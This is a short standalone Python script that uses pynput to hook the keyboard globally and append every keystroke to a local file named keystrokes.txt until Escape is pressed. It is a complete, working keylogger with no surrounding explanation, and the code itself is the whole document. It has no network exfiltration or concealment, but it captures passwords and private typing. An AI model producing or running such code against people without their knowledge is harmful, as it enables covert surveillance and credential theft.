from pynput.keyboard import Key, Listener

def on_press(key):
    with open("keystrokes.txt", "a") as f:
        try:
            f.write(f'{key.char}')
        except AttributeError:
            if key == Key.space:
                f.write(' ')
            else:
                f.write(f'{key}')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
